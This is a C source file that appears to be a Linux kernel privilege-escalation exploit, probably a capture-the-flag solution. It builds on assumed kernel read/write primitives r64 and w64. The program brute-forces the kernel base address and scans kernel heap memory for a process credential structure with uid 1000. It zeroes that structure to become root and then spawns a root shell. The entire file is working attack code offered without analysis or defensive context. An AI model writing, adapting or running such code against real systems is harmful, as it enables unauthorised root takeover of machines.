#include <sys/mman.h>
#include <stdint.h>
#include <stdio.h>

int64_t r64(int64_t);
int64_t w64(int64_t, int64_t);

uint64_t addr = 0xFFFFFFFF80000000;
uint64_t *map;
uint64_t heap, prev;

int main() {
  map = mmap(NULL, 0x1000, 3, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  while(!map[0]) {
    if(fork() == 0) {
      printf("%p (%p)\n", r64(addr), addr);
      map[0] = addr;
      
      printf("heap: %p\n", heap = r64(addr + 0xe40950));
      while(1) {
        uint64_t value = r64(heap);
        if(value == 0x3e8 + (0x3e8LL << 32) && prev == value) {
          printf("found! %p\n", heap);
          w64(heap - 8, 0);
          w64(heap, 0);
          w64(heap + 8, 0);
          w64(heap + 16, 0);
          w64(heap + 24, 0);
          w64(heap + 32, 0);
          printf("euid: %d\n", geteuid());
          setreuid(0, 0);
          if(geteuid() == 0) {
            system("sh");
          }
          // break;
        }
        heap -= 8;
        prev = value;
      }
      // w64(addr + 0xe40950, 0x41414141);
      return 0;
    }
    wait(NULL);
    addr += 0x100000;
  }
}
